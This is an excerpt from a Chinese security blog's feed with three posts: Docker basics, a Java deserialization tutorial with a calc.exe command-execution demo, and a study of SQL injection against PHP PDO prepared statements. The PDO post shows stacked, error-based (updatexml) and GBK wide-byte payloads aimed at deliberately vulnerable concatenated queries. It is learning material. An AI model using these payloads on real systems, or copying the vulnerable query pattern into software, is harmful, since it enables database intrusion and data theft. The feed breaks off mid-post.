    <title>Docker</title>
    <link href="http://bai-ren-1.github.io/2020/04/05/Docker/"/>
    <id>http://bai-ren-1.github.io/2020/04/05/Docker/</id>
    <published>2020-04-05T05:01:14.000Z</published>
    <updated>2020-04-05T05:43:31.679Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>哎，要上班了。在家呆了这么久，突然得自己一人去工作，很不舍。不过，始终得静下心来，毕竟颓了这么久。所以今天写一篇简单的博客，记录一下工作技术栈之一的Docker简单用法。</p><h2 id="0x00-容器使用"><a href="#0x00-容器使用" class="headerlink" title="0x00 容器使用"></a>0x00 容器使用</h2><p>这里我把命令都集合在一起，看起来比较方便。下面都是有关容器的一些用法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull &lt;镜像名称&gt;  # 获取镜像</span><br><span class="line">$ docker run &lt;镜像名称&gt;       # 启动容器</span><br><span class="line">$ docker ps -a    # 查看所有容器列表</span><br><span class="line">$ docker start &lt;容器 ID&gt;  # 启动已停止的容器</span><br><span class="line">$ docker stop &lt;容器 ID&gt; # 停止容器</span><br><span class="line">$ docker restart &lt;容器 ID&gt; # 重启容器（启动容器是第一次，用的是run且参数是镜像）</span><br><span class="line">$ docker attach &lt;容器 ID&gt; # 进入容器（-d 参数时，容器启动后会进入后台，用attach可进入容器）</span><br><span class="line">$ docker export &lt;容器 ID&gt; &gt; &lt;文件名&gt; # 导出容器</span><br><span class="line">$ docker rm -f &lt;容器 ID&gt;      # 删除容器</span><br></pre></td></tr></table></figure><h2 id="0x01-镜像使用"><a href="#0x01-镜像使用" class="headerlink" title="0x01 镜像使用"></a>0x01 镜像使用</h2><p>OK，看完了容器，我们就来学习用法开启容器的镜像的用法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker images  # 列出本地镜像列表</span><br><span class="line">$ docker pull &lt;镜像名称&gt;:&lt;版本号&gt;# 拉取镜像到本地</span><br><span class="line">$ docker search &lt;搜索关键字&gt;  # 查找仓库的镜像</span><br><span class="line">$ docker rmi &lt;镜像名称&gt;# 删除本地镜像</span><br><span class="line">$ docker build# 创建新的镜像</span><br></pre></td></tr></table></figure><h2 id="0x02-仓库管理"><a href="#0x02-仓库管理" class="headerlink" title="0x02 仓库管理"></a>0x02 仓库管理</h2><p>我们要拉取镜像到本地，都是到仓库上面找的，仓库是集中存放镜像的地方。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker login# 登录仓库</span><br><span class="line">$ docker logout# 注销仓库</span><br><span class="line">$ docker push &lt;用户名&gt;/&lt;镜像名称&gt;:&lt;版本号&gt;# 推送镜像</span><br></pre></td></tr></table></figure><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>当然还有制作Dockerfile的内容，但是太多辣，这里先不写着了。等工作用到的时候再记录进来，祝一切顺利吧！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Docker&quot;&gt;&lt;a href=&quot;#Docker&quot; class=&quot;headerlink&quot; title=&quot;Docker&quot;&gt;&lt;/a&gt;Docker&lt;/h1&gt;&lt;p&gt;哎，要上班了。在家呆了这么久，突然得自己一人去工作，很不舍。不过，始终得静下心来，毕竟颓了这么久。所以今天写
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Java反序列化</title>
    <link href="http://bai-ren-1.github.io/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://bai-ren-1.github.io/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-04-01T06:12:03.000Z</published>
    <updated>2020-04-02T03:20:58.945Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><p>没啥好说的，比赛打太多的憨批只会PHP，实际工作都是Java，鬼特么现在还有人用PHP就奇了。所以这里记录一下Java反序列化的机制，下一节博客再说Java反序列化漏洞。</p><h2 id="0x00-概念"><a href="#0x00-概念" class="headerlink" title="0x00 概念"></a>0x00 概念</h2><p>序列化和反序列化的实现方法概念？</p><ul><li>Java 序列化是指把 Java 对象转换为字节序列的过程。ObjectOutputStream类的 <strong>writeObject()方法</strong>可以实现序列化。</li><li>Java 反序列化是指把字节序列恢复为 Java 对象的过程。ObjectInputStream 类的 <strong>readObject()方法</strong>用于反序列化。</li></ul><blockquote><p>那么序列化的目的是什么呢？序列化与反序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。 </p></blockquote><h2 id="0x01-实现方法"><a href="#0x01-实现方法" class="headerlink" title="0x01 实现方法"></a>0x01 实现方法</h2><p>Java中的一个类的对象要想序列化成功，必须满足两个条件：</p><ul><li>该类必须实现 <strong>java.io.Serializable 接口</strong>，因为 Serializable 接口是启用其序列化功能的接口。</li><li>该类的所有属性必须是可序列化的。</li></ul><blockquote><p>关于<strong>接口和抽象方法</strong>等的相关知识请自行查阅相关课程。</p></blockquote><p>我们做一个简单的实验，用来验证序列化和反序列化的过程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shabi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现Serializable接口的Student类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(String sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//实现serialize接口的三个抽象方法，这里只是简单打印消息进行验证</span></span><br><span class="line">    <span class="comment">//不实现，也是能直接调用ObjectInputStream.readObject进行反序列化</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">          System.out.println(<span class="string">"Student readObject"</span>);</span><br><span class="line">         s.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//不实现，也是能直接调用ObjectOutputStream.writeObject进行序列化的    </span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream s)</span><span class="keyword">throws</span> java.io.IOException</span>&#123;</span><br><span class="line">          System.out.println(<span class="string">"Student writeObject"</span>);</span><br><span class="line">          s.defaultWriteObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          System.out.println(<span class="string">"Student readResolve"</span>);</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> FileNotFoundException, IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    Student student = <span class="keyword">new</span> Student();</span><br><span class="line">    student.setName(<span class="string">"chenxiaoyi"</span>);</span><br><span class="line">    student.setSex(<span class="string">"man"</span>);</span><br><span class="line"><span class="keyword">try</span> (ObjectOutputStream output = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">"Student.txt"</span>)))) &#123;</span><br><span class="line">output.writeObject(student);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">try</span> (ObjectInputStream input = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">"Student.txt"</span>)))) &#123;</span><br><span class="line">Student student1 = (Student) input.readObject();</span><br><span class="line">System.out.println(student1.getName() + <span class="string">":"</span> + student1.getSex());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果目标类中没有定义私有的writeObject或readObject方法，那么序列化和反序列化的时候将调用默认的方法来根据目标类中的属性（不包含transient修饰的属性以及static变量）来进行序列化和反序列化。</p><p>如果目标类中定义了私有的writeObject或readObject方法，那么序列化和反序列化的时候将通过反射调用目标类指定的writeObject或readObject方法来实现，比如将static变量也加入到序列化中。</p><p>至于readResolve同样也是通过<strong>反射</strong>调用的。从内存中反序列化地”组装”一个新对象时，就会自动调用这个 readResolve方法来返回指定好的对象。从上面结果可以看到它是在readObject之后调用的，因此readResolve可以最终修改反序列化得到的对象。</p></blockquote><p>关于相关的序列化和反序列化的过程的学习，要具体看下面实验：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt>在开始实验之前，我们可以看到项目的根目录下没有序列化文件的存在。OK，我们可以开始实验了。</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt></p><p>我们开始进行debug，看看这个具体过程。下断点，然后慢慢运行到对象输出流的<strong>writeObject方法</strong>即序列化处：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt></p><p>当运行到此时，我们可以看到已经生成了一个student对象和一个对象输出流output，我们看根目录下生成的Student.txt对象流文件：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt></p><blockquote><p>ObjectOutputStream建立后第一次写入一个对象时，会在对象数据前写入一些标志的数据“ACED0005” </p></blockquote><p>我们继续step over，看看执行完writeObject后的结果：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" alt></p><p>winhex中打开的Student.txt相应的变化了，文件中写入了我们需要的序列化内容：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt></p><p>序列化的内容实验好了，我们继续往下看看反序列化的实验：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt></p><p>程序在执行完对象输入流的<strong>readObject方法</strong>后，可见反序列化的得到的新对象student1的属性和原对象student的属性时一样的。OK，自此序列化和反序列化的触发点和具体展示效果实验结束。</p><h2 id="0x02-特点"><a href="#0x02-特点" class="headerlink" title="0x02 特点"></a>0x02 特点</h2><p>Java的序列化常见一般是通过两种方式：</p><ul><li>实现 Serializable 接口。</li><li>实现 Externalizable 接口。</li></ul><p>实现Serialize接口的序列化注意点有：</p><ul><li>序列化时，不会序列化<strong>静态变量</strong>，因为只有堆内存会被序列化，所以静态变量会天生不会被序列化。</li><li>序列化时，不会序列化<strong>transient</strong>修饰的变量，也就是通过序列化后再被反序列化后读取这个变量不会有值。</li><li>反序列化时，不会调用对象的任何<strong>构造方法</strong>。</li></ul><p>为了验证上面的特性，我对原来的代码进行一些小修改：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt></p><p>我把两个属性分别加上静态声明和transient进行声明，重新进行序列化和反序列化操作，得到的结果如下：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png" alt></p><p>可以看到我们的用<strong>transient修饰</strong>的属性反序列化为空了，原因在于序列化的时候不会序列化其修饰的属性，所以自然为空。但是这里会有个奇怪的地方，为什么<strong>static修饰</strong>的静态变量也没写入文件，怎么反序列化会有值？</p><blockquote><p>这里被static修饰的变量反序列化后有值是因为：静态变量在方法区,本来流里面就没有写入静态变量,我们打印静态变量当然会去方法区查找。我们当前jvm中有，所以静态变量在序列化后仍然有值。 </p><p>由此可以看出 static 修饰的变量本身是不会被序列化的。我们读取的值是当前jvm中的方法区对应此变量的值，所以最后输出的值为我们对static变量后赋的值。</p></blockquote><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png" alt></p><p>我们通过生成的文件也可以看出来，两个被修饰变量都没有被保存进序列化文件中。</p><h2 id="0x03-简单实验"><a href="#0x03-简单实验" class="headerlink" title="0x03 简单实验"></a>0x03 简单实验</h2><p>前面我们能知道序列化过程依赖于 ObjectOutputStream 类中 <strong>writeObject</strong> 方法，而反序列化的过程是依赖于 ObjectOutputStream 类中 <strong>readObject</strong> 方法。 如果实际情况下，我们能够重写 <strong>readObject</strong> 方法，那么就有可能达到反序列化的时候命令执行的作用。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shabi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Calc</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"><span class="comment">//控制了反序列化的具体实现，将来攻击的地方就是在于控制它反序列化时执行的函数</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream input)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数入口</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">Calc calc = <span class="keyword">new</span> Calc();</span><br><span class="line"><span class="comment">//序列化过程，写入被我们控制的了的序列化对象</span></span><br><span class="line">FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"shabi.txt"</span>);</span><br><span class="line">ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">oos.writeObject(calc);</span><br><span class="line">oos.close();</span><br><span class="line"><span class="comment">//反序列化过程，会反序列化出被我们控制了的对象</span></span><br><span class="line">FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"shabi.txt"</span>);</span><br><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">Calc pwnedcalc = (Calc)ois.readObject();</span><br><span class="line">ois.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里只是简单的演示一下最经典的弹计算器，OK我们已经实现被我们<strong>控制的类Serialize接口的实现为弹出计算器</strong>，为了简单我也把序列化和反序列化过程一次写在主函数中，然后我们执行：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png" alt></p><p>成功弹出了计算器。</p><blockquote><p>流程总结：实现了Serialize接口的可被反序列化的Calc类被序列化进shabi.txt文件 -&gt; 从shabi.txt文件中恢复对象 -&gt; 调用被恢复对象的readObject方法 -&gt; 命令执行弹出计算器</p></blockquote><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>这一篇主要是简单写一下关于Java的反序列化的一些简单知识，后面才会具体加上一些例子来Java反序列化的漏洞，前路漫漫，继续努力！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java反序列化&quot;&gt;&lt;a href=&quot;#Java反序列化&quot; class=&quot;headerlink&quot; title=&quot;Java反序列化&quot;&gt;&lt;/a&gt;Java反序列化&lt;/h1&gt;&lt;p&gt;没啥好说的，比赛打太多的憨批只会PHP，实际工作都是Java，鬼特么现在还有人用PHP就奇了
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL预编译绕过</title>
    <link href="http://bai-ren-1.github.io/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/"/>
    <id>http://bai-ren-1.github.io/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/</id>
    <published>2020-03-24T03:37:39.000Z</published>
    <updated>2020-07-16T13:26:54.888Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL预编译绕过"><a href="#SQL预编译绕过" class="headerlink" title="SQL预编译绕过"></a>SQL预编译绕过</h1><p>众所周知，预编译是用来防御SQL注入的最有效的手段之一。然而只要我们使用了预编译，就能保证万无一失吗？下面通过PHP的PDO进行一番探究。</p><h2 id="0x00-PDO相关配置"><a href="#0x00-PDO相关配置" class="headerlink" title="0x00 PDO相关配置"></a>0x00 PDO相关配置</h2><blockquote><p>PDO::ATTR_EMULATE_PREPARES</p><p>PDO::ATTR_ERRMODE</p><p>PDO::MYSQL_ATTR_MULTI_STATEMENTS</p></blockquote><p>在PDO中，与安全性相关的选项就是上面的三个，分别对应着：模拟预编译，报错，多条执行。</p><h2 id="0x01-动态拼接语句"><a href="#0x01-动态拼接语句" class="headerlink" title="0x01 动态拼接语句"></a>0x01 动态拼接语句</h2><p>下面各个小章节的PDO都由下面的代码执行，其中SQL预编译语句时使用了动态的<strong>参数拼接</strong>（.$_GET[‘field’].）。这是导致错误的最重要因素：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);</span></span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$sql = <span class="string">"select id,"</span>.$_GET[<span class="string">'field'</span>].<span class="string">" from user where username = ?"</span>;</span><br><span class="line">$stmt = $pdo-&gt;prepare($sql);</span><br><span class="line">$stmt-&gt;bindParam(<span class="number">1</span>,$username);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line"><span class="keyword">while</span>($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))</span><br><span class="line">&#123;</span><br><span class="line">    var_dump($row);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="01-开启多条执行"><a href="#01-开启多条执行" class="headerlink" title="01.开启多条执行"></a>01.开启多条执行</h3><p>当开启了多条执行时，不论另外两个参数的选项是什么，都可以照成堆叠注入查询多个结果：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;field=username from user;select id</span><br></pre></td></tr></table></figure><p>因为开启动态拼接，模板语句会拼接成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,username <span class="keyword">from</span> <span class="keyword">user</span>;<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">"admin"</span></span><br></pre></td></tr></table></figure><p>然后因为开启了多条执行，会导致两个查询语句都被执行，照成堆叠注入。</p><blockquote><p>结论：开启多条执行选项 + 模板语句动态拼接能导致堆叠注入。</p></blockquote><h3 id="02-开启多条执行-报错"><a href="#02-开启多条执行-报错" class="headerlink" title="02.开启多条执行+报错"></a>02.开启多条执行+报错</h3><p>当开启了多条执行和报错时，不论是否开启了非模拟编译，照样同上例可以通过堆叠加报错进行注入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;field=updatexml(0x7e,concat(0x7e,user(),0x7e),0x7e)from user;select id</span><br></pre></td></tr></table></figure><p>拼接到模板语句上面就会拼接成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,updatexml(<span class="number">0x7e</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">0x7e</span>)<span class="keyword">from</span> <span class="keyword">user</span>;<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="keyword">admin</span></span><br></pre></td></tr></table></figure><p>然后因为开启了报错模式，会导致第一次查询就报错获得结果（我们通过报错信息获得我们要查询的信息）。然后SQL查询报错据推出，第二条正常语句不会执行。</p><blockquote><p>结论：开启多条执行+开启报错执行+模板语句动态拼接能导致报错注入。</p></blockquote><h3 id="03-单独开启报错"><a href="#03-单独开启报错" class="headerlink" title="03.单独开启报错"></a>03.单独开启报错</h3><p>对于多条执行+报错的条件，让我们不禁思考：如果单独开启报错选项，而不能多条执行，还能成功吗？答案是可以的。拼接完的语句依然是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,updatexml(<span class="number">0x7e</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">0x7e</span>)<span class="keyword">from</span> <span class="keyword">user</span>;<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="keyword">admin</span></span><br></pre></td></tr></table></figure><p>这时候因为没开启多条执行，只能查询一句SQL，所以只会执行报错查询语句（但我们的目的已经达成了）</p><blockquote><p>结论：开启报错执行+模板语句动态拼接，假如报错查询在第一条查询的位置，就能导致报错注入。</p></blockquote><h2 id="0x02-正常绑定语句"><a href="#0x02-正常绑定语句" class="headerlink" title="0x02 正常绑定语句"></a>0x02 正常绑定语句</h2><p>上面章节的导致的注入的其实很傻逼，那是因为它准备的模板语句是动态拼接的，这样和普通的SQL根本没啥区别。</p><p>但如果我们在查询语句中没有可控的参数，并把输入的参数按照prepare-&gt;bindParam-&gt;execute的方式去写就一定没有问题了吗？下面是我们的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select balabala from table1 where 1=?"</span>; </span><br><span class="line">$row = $db-&gt;prepare($query); </span><br><span class="line">$row-&gt;bindParam(<span class="number">1</span>,$_GET[‘id’]); </span><br><span class="line">$row-&gt;execute();</span><br></pre></td></tr></table></figure><h3 id="01-开启模拟编译-多条执行"><a href="#01-开启模拟编译-多条执行" class="headerlink" title="01.开启模拟编译+多条执行"></a>01.开启模拟编译+多条执行</h3><p>我们看下面的代码，模板语句没有拼接，用了占位符绑定参数，看起来很正常：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select balabala from table1 where 1=?"</span>; </span><br><span class="line">$row = $db-&gt;prepare($query); </span><br><span class="line">$row-&gt;bindParam(<span class="number">1</span>,$_GET[‘id’]); </span><br><span class="line">$row-&gt;execute();</span><br></pre></td></tr></table></figure><p>我们在URL中随便输入一个参数：?id=asdasd，然后通过设置SET GLOBAL GENERAL_LOG=ON，从log里看出究竟执行了什么：</p><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/1.png" alt></p><p>我们发现<strong>模拟预编译</strong>的请求发送方式和以往的mysqli并没有什么区别。而且对参数使用<strong>单引号</strong>进行了包裹。于是我们可以尝试输入一些特殊字符，比如单引号： </p><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/2.png" alt></p><p>可以看到，他在我们输入的单引号前加上了反斜杠进行转义，自然我们想到了宽字节注入。可见GBK编码下，单引号逃逸了出来。并且因为我们开启了多条执行，所以后面的查询也执行了：</p><p><img src="/2020/03/24/SQL%E9%A2%84%E7%BC%96%E8%AF%91%E7%BB%95%E8%BF%87/3.png" alt></p><blockquote><p>结论：模板语句没有动态拼接，并且正常绑定参数。假如设置GBK编码，在模拟编译下可以逃逸出单引进行宽字节注入；并且开启多条执行选项下也照样能堆叠注入。</p></blockquote><h3 id="02-单独开启模拟编译"><a href="#02-单独开启模拟编译" class="headerlink" 